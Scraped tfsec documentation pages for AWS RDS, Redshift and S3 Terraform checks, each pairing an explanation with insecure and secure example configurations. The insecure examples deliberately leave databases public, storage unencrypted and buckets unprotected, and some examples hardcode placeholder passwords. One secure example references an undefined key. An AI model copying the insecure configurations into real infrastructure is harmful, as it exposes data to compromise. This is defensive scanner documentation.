{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/rds/enable-performance-insights-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/rds/enable-performance-insights-encryption/index.md", "content": "---\ntitle: Encryption for RDS Performance Insights should be enabled.\n---\n\n# Encryption for RDS Performance Insights should be enabled.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nWhen enabling Performance Insights on an RDS cluster or RDS DB Instance, and encryption key should be provided.\n\nThe encryption key specified in `performance_insights_kms_key_id` references a KMS ARN\n\n### Possible Impact\nData can be read from the RDS Performance Insights if it is compromised\n\n### Suggested Resolution\nEnable encryption for RDS clusters and instances\n\n\n### Insecure Example\n\nThe following example will fail the aws-rds-enable-performance-insights-encryption check.\n```terraform\n\nresource \"aws_rds_cluster_instance\" \"bad_example\" {\n\tname = \"bar\"\n\tperformance_insights_enabled = true\n\tperformance_insights_kms_key_id = \"\"\n}\n\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-rds-enable-performance-insights-encryption check.\n```terraform\n\nresource \"aws_rds_cluster_instance\" \"good_example\" {\n\tname = \"bar\"\n\tperformance_insights_enabled = true\n\tperformance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n}\n\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.htm](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.htm){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:25.266936"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/rds/enable-performance-insights/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/rds/enable-performance-insights/index.md", "content": "---\ntitle: Enable Performance Insights to detect potential problems\n---\n\n# Enable Performance Insights to detect potential problems\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nEnabling Performance insights allows for greater depth in monitoring data.\n\t\t\nFor example, information about active sessions could help diagose a compromise or assist in the investigation\n\n### Possible Impact\nWithout adequate monitoring, performance related issues may go unreported and potentially lead to compromise.\n\n### Suggested Resolution\nEnable performance insights\n\n\n### Insecure Example\n\nThe following example will fail the aws-rds-enable-performance-insights check.\n```terraform\n\nresource \"aws_rds_cluster_instance\" \"bad_example\" {\n\tname = \"bar\"\n\tperformance_insights_enabled = false\n\tperformance_insights_kms_key_id = \"\"\n}\n\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-rds-enable-performance-insights check.\n```terraform\n\nresource \"aws_rds_cluster_instance\" \"good_example\" {\n\tname = \"bar\"\n\tperformance_insights_enabled = true\n\tperformance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n}\n\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://aws.amazon.com/rds/performance-insights/](https://aws.amazon.com/rds/performance-insights/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:25.556915"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/rds/encrypt-cluster-storage-data/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/rds/encrypt-cluster-storage-data/index.md", "content": "---\ntitle: There is no encryption specified or encryption is disabled on the RDS Cluster.\n---\n\n# There is no encryption specified or encryption is disabled on the RDS Cluster.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEncryption should be enabled for an RDS Aurora cluster. \n\nWhen enabling encryption by setting the kms_key_id, the storage_encrypted must also be set to true.\n\n### Possible Impact\nData can be read from the RDS cluster if it is compromised\n\n### Suggested Resolution\nEnable encryption for RDS clusters\n\n\n### Insecure Example\n\nThe following example will fail the aws-rds-encrypt-cluster-storage-data check.\n```terraform\n\n resource \"aws_rds_cluster\" \"bad_example\" {\n   name       = \"bar\"\n   kms_key_id = \"\"\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-rds-encrypt-cluster-storage-data check.\n```terraform\n\n resource \"aws_rds_cluster\" \"good_example\" {\n   name              = \"bar\"\n   kms_key_id  = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n   storage_encrypted = true\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:25.829490"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/rds/encrypt-instance-storage-data/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/rds/encrypt-instance-storage-data/index.md", "content": "---\ntitle: RDS encryption has not been enabled at a DB Instance level.\n---\n\n# RDS encryption has not been enabled at a DB Instance level.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEncryption should be enabled for an RDS Database instances. \n\nWhen enabling encryption by setting the kms_key_id.\n\n### Possible Impact\nData can be read from RDS instances if compromised\n\n### Suggested Resolution\nEnable encryption for RDS instances\n\n\n### Insecure Example\n\nThe following example will fail the aws-rds-encrypt-instance-storage-data check.\n```terraform\n\n resource \"aws_db_instance\" \"bad_example\" {\n \t\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-rds-encrypt-instance-storage-data check.\n```terraform\n\n resource \"aws_db_instance\" \"good_example\" {\n \tstorage_encrypted  = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:26.087120"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/rds/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/rds/index.md", "content": "---\ntitle: rds\n---\n\n# rds\n\n## Checks\n\n\n- [enable-performance-insights](enable-performance-insights) Enable Performance Insights to detect potential problems\n\n- [enable-performance-insights-encryption](enable-performance-insights-encryption) Encryption for RDS Performance Insights should be enabled.\n\n- [encrypt-cluster-storage-data](encrypt-cluster-storage-data) There is no encryption specified or encryption is disabled on the RDS Cluster.\n\n- [encrypt-instance-storage-data](encrypt-instance-storage-data) RDS encryption has not been enabled at a DB Instance level.\n\n- [no-classic-resources](no-classic-resources) AWS Classic resource usage.\n\n- [no-public-db-access](no-public-db-access) A database resource is marked as publicly accessible.\n\n- [specify-backup-retention](specify-backup-retention) RDS Cluster and RDS instance should have backup retention longer than default 1 day\n\n\n\n", "timestamp": "2025-10-24T22:24:26.295414"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/rds/no-classic-resources/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/rds/no-classic-resources/index.md", "content": "---\ntitle: AWS Classic resource usage.\n---\n\n# AWS Classic resource usage.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nAWS Classic resources run in a shared environment with infrastructure owned by other AWS customers. You should run\nresources in a VPC instead.\n\n### Possible Impact\nClassic resources are running in a shared environment with other customers\n\n### Suggested Resolution\nSwitch to VPC resources\n\n\n### Insecure Example\n\nThe following example will fail the aws-rds-no-classic-resources check.\n```terraform\n\n resource \"aws_db_security_group\" \"bad_example\" {\n   # ...\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-rds-no-classic-resources check.\n```terraform\n\n resource \"aws_security_group\" \"good_example\" {\n   # ...\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_security_group](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_security_group){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-classic-platform.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-classic-platform.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:26.581025"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/rds/no-public-db-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/rds/no-public-db-access/index.md", "content": "---\ntitle: A database resource is marked as publicly accessible.\n---\n\n# A database resource is marked as publicly accessible.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nDatabase resources should not publicly available. You should limit all access to the minimum that is required for your application to function.\n\n### Possible Impact\nThe database instance is publicly accessible\n\n### Suggested Resolution\nSet the database to not be publicly accessible\n\n\n### Insecure Example\n\nThe following example will fail the aws-rds-no-public-db-access check.\n```terraform\n\n resource \"aws_db_instance\" \"bad_example\" {\n \tpublicly_accessible = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-rds-no-public-db-access check.\n```terraform\n\n resource \"aws_db_instance\" \"good_example\" {\n \tpublicly_accessible = false\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.WorkingWithRDSInstanceinaVPC.html#USER_VPC.Hiding](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.WorkingWithRDSInstanceinaVPC.html#USER_VPC.Hiding){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:26.876689"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/rds/specify-backup-retention/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/rds/specify-backup-retention/index.md", "content": "---\ntitle: RDS Cluster and RDS instance should have backup retention longer than default 1 day\n---\n\n# RDS Cluster and RDS instance should have backup retention longer than default 1 day\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nRDS backup retention for clusters defaults to 1 day, this may not be enough to identify and respond to an issue. Backup retention periods should be set to a period that is a balance on cost and limiting risk.\n\n### Possible Impact\nPotential loss of data and short opportunity for recovery\n\n### Suggested Resolution\nExplicitly set the retention period to greater than the default\n\n\n### Insecure Example\n\nThe following example will fail the aws-rds-specify-backup-retention check.\n```terraform\n\n resource \"aws_db_instance\" \"bad_example\" {\n \tallocated_storage    = 10\n \tengine               = \"mysql\"\n \tengine_version       = \"5.7\"\n \tinstance_class       = \"db.t3.micro\"\n \tname                 = \"mydb\"\n \tusername             = \"foo\"\n \tpassword             = \"foobarbaz\"\n \tparameter_group_name = \"default.mysql5.7\"\n \tskip_final_snapshot  = true\n }\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-rds-specify-backup-retention check.\n```terraform\n\n resource \"aws_rds_cluster\" \"good_example\" {\n \tcluster_identifier      = \"aurora-cluster-demo\"\n \tengine                  = \"aurora-mysql\"\n \tengine_version          = \"5.7.mysql_aurora.2.03.2\"\n \tavailability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n \tdatabase_name           = \"mydb\"\n \tmaster_username         = \"foo\"\n \tmaster_password         = \"bar\"\n \tbackup_retention_period = 5\n \tpreferred_backup_window = \"07:00-09:00\"\n   }\n \n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster#backup_retention_period](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster#backup_retention_period){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#backup_retention_period](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#backup_retention_period){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_WorkingWithAutomatedBackups.html#USER_WorkingWithAutomatedBackups.BackupRetention](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_WorkingWithAutomatedBackups.html#USER_WorkingWithAutomatedBackups.BackupRetention){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:27.169325"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/redshift/encryption-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/redshift/encryption-customer-key/index.md", "content": "---\ntitle: Redshift clusters should use at rest encryption\n---\n\n# Redshift clusters should use at rest encryption\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nRedshift clusters that contain sensitive data or are subject to regulation should be encrypted at rest to prevent data leakage should the infrastructure be compromised.\n\n### Possible Impact\nData may be leaked if infrastructure is compromised\n\n### Suggested Resolution\nEnable encryption using CMK\n\n\n### Insecure Example\n\nThe following example will fail the aws-redshift-encryption-customer-key check.\n```terraform\n\n resource \"aws_redshift_cluster\" \"bad_example\" {\n   cluster_identifier = \"tf-redshift-cluster\"\n   database_name      = \"mydb\"\n   master_username    = \"foo\"\n   master_password    = \"Mustbe8characters\"\n   node_type          = \"dc1.large\"\n   cluster_type       = \"single-node\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-redshift-encryption-customer-key check.\n```terraform\n\n resource \"aws_kms_key\" \"redshift\" {\n \tenable_key_rotation = true\n }\n \n resource \"aws_redshift_cluster\" \"good_example\" {\n   cluster_identifier = \"tf-redshift-cluster\"\n   database_name      = \"mydb\"\n   master_username    = \"foo\"\n   master_password    = \"Mustbe8characters\"\n   node_type          = \"dc1.large\"\n   cluster_type       = \"single-node\"\n   encrypted          = true\n   kms_key_id         = aws_kms_key.redshift.key_id\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#encrypted](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#encrypted){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/redshift/latest/mgmt/working-with-db-encryption.html](https://docs.aws.amazon.com/redshift/latest/mgmt/working-with-db-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:27.597870"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/redshift/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/redshift/index.md", "content": "---\ntitle: redshift\n---\n\n# redshift\n\n## Checks\n\n\n- [encryption-customer-key](encryption-customer-key) Redshift clusters should use at rest encryption\n\n- [use-vpc](use-vpc) Redshift cluster should be deployed into a specific VPC\n\n\n\n", "timestamp": "2025-10-24T22:24:27.712936"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/redshift/use-vpc/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/redshift/use-vpc/index.md", "content": "---\ntitle: Redshift cluster should be deployed into a specific VPC\n---\n\n# Redshift cluster should be deployed into a specific VPC\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nRedshift clusters that are created without subnet details will be created in EC2 classic mode, meaning that they will be outside of a known VPC and running in tenant.\n\nIn order to benefit from the additional security features achieved with using an owned VPC, the subnet should be set.\n\n### Possible Impact\nRedshift cluster does not benefit from VPC security if it is deployed in EC2 classic mode\n\n### Suggested Resolution\nDeploy Redshift cluster into a non default VPC\n\n\n### Insecure Example\n\nThe following example will fail the aws-redshift-use-vpc check.\n```terraform\n\n resource \"aws_redshift_cluster\" \"bad_example\" {\n \tcluster_identifier = \"tf-redshift-cluster\"\n \tdatabase_name      = \"mydb\"\n \tmaster_username    = \"foo\"\n \tmaster_password    = \"Mustbe8characters\"\n \tnode_type          = \"dc1.large\"\n \tcluster_type       = \"single-node\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-redshift-use-vpc check.\n```terraform\n\n resource \"aws_redshift_cluster\" \"good_example\" {\n \tcluster_identifier = \"tf-redshift-cluster\"\n \tdatabase_name      = \"mydb\"\n \tmaster_username    = \"foo\"\n \tmaster_password    = \"Mustbe8characters\"\n \tnode_type          = \"dc1.large\"\n \tcluster_type       = \"single-node\"\n \n \tcluster_subnet_group_name = \"redshift_subnet\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#cluster_subnet_group_name](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#cluster_subnet_group_name){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/redshift/latest/mgmt/managing-clusters-vpc.html](https://docs.aws.amazon.com/redshift/latest/mgmt/managing-clusters-vpc.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:28.048785"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/block-public-acls/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/block-public-acls/index.md", "content": "---\ntitle: S3 Access block should block public ACL\n---\n\n# S3 Access block should block public ACL\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\n\nS3 buckets should block public ACLs on buckets and any objects they contain. By blocking, PUTs with fail if the object has any public ACL a.\n\n\n### Possible Impact\nPUT calls with public ACLs specified can make objects public\n\n### Suggested Resolution\nEnable blocking any PUT calls with a public ACL specified\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-block-public-acls check.\n```terraform\n\nresource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.bad_example.id\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-block-public-acls check.\n```terraform\n\nresource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket = aws_s3_bucket.good_example.id\n  block_public_acls = true\n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_acls](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_acls){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:28.492663"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/block-public-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/block-public-policy/index.md", "content": "---\ntitle: S3 Access block should block public policy\n---\n\n# S3 Access block should block public policy\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\n\nS3 bucket policy should have block public policy to prevent users from putting a policy that enable public access.\n\n\n### Possible Impact\nUsers could put a policy that allows public access\n\n### Suggested Resolution\nPrevent policies that allow public access being PUT\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-block-public-policy check.\n```terraform\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id\n}\n \nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id \n  block_public_policy = false\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-block-public-policy check.\n```terraform\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket = aws_s3_bucket.example.id \n  block_public_policy = true \n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/dev-retired/access-control-block-public-access.html](https://docs.aws.amazon.com/AmazonS3/latest/dev-retired/access-control-block-public-access.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:28.756190"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/enable-bucket-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/enable-bucket-encryption/index.md", "content": "---\ntitle: Unencrypted S3 bucket.\n---\n\n# Unencrypted S3 bucket.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nS3 Buckets should be encrypted to protect the data that is stored within them if access is compromised.\n\n### Possible Impact\nThe bucket objects could be read if compromised\n\n### Suggested Resolution\nConfigure bucket encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-enable-bucket-encryption check.\n```terraform\n\n resource \"aws_s3_bucket\" \"bad_example\" {\n   bucket = \"mybucket\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-enable-bucket-encryption check.\n```terraform\n\n resource \"aws_s3_bucket\" \"good_example\" {\n   bucket = \"mybucket\"\n \n   server_side_encryption_configuration {\n     rule {\n       apply_server_side_encryption_by_default {\n         kms_master_key_id = \"arn\"\n         sse_algorithm     = \"aws:kms\"\n       }\n     }\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-encryption.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:29.036375"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/enable-bucket-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/enable-bucket-logging/index.md", "content": "---\ntitle: S3 Bucket does not have logging enabled.\n---\n\n# S3 Bucket does not have logging enabled.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nBuckets should have logging enabled so that access can be audited.\n\n### Possible Impact\nThere is no way to determine the access to this bucket\n\n### Suggested Resolution\nAdd a logging block to the resource to enable access logging\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-enable-bucket-logging check.\n```terraform\n\nresource \"aws_s3_bucket\" \"bad_example\" {\n\n}\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-enable-bucket-logging check.\n```terraform\n\nresource \"aws_s3_bucket\" \"good_example\" {\n\tlogging {\n\t\ttarget_bucket = \"target-bucket\"\n\t}\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/dev/ServerLogs.html](https://docs.aws.amazon.com/AmazonS3/latest/dev/ServerLogs.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:29.300780"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/enable-versioning/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/enable-versioning/index.md", "content": "---\ntitle: S3 Data should be versioned\n---\n\n# S3 Data should be versioned\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\n\nVersioning in Amazon S3 is a means of keeping multiple variants of an object in the same bucket. \nYou can use the S3 Versioning feature to preserve, retrieve, and restore every version of every object stored in your buckets. \nWith versioning you can recover more easily from both unintended user actions and application failures.\n\n\n### Possible Impact\nDeleted or modified data would not be recoverable\n\n### Suggested Resolution\nEnable versioning to protect against accidental/malicious removal or modification\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-enable-versioning check.\n```terraform\n\nresource \"aws_s3_bucket\" \"bad_example\" {\n\n}\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-enable-versioning check.\n```terraform\n\nresource \"aws_s3_bucket\" \"good_example\" {\n\n\tversioning {\n\t\tenabled = true\n\t}\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:29.565258"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/s3/encryption-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/s3/encryption-customer-key/index.md", "content": "---\ntitle: S3 encryption should use Customer Managed Keys\n---\n\n# S3 encryption should use Customer Managed Keys\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEncryption using AWS keys provides protection for your S3 buckets. To increase control of the encryption and manage factors like rotation use customer managed keys.\n\n### Possible Impact\nUsing AWS managed keys does not allow for fine grained control\n\n### Suggested Resolution\nEnable encryption using customer managed keys\n\n\n### Insecure Example\n\nThe following example will fail the aws-s3-encryption-customer-key check.\n```terraform\n\nresource \"aws_s3_bucket\" \"bad_exampl\" {\n   bucket = \"mybucket\"\n\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        sse_algorithm     = \"AES256\"\n      }\n    }\n  }\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-s3-encryption-customer-key check.\n```terraform\n\nresource \"aws_kms_key\" \"good_example\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n   bucket = \"mybucket\"\n \n   server_side_encryption_configuration {\n     rule {\n       apply_server_side_encryption_by_default {\n         kms_master_key_id = aws_kms_key.example.arn\n         sse_algorithm     = \"aws:kms\"\n       }\n     }\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-encryption.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:29.871848"}
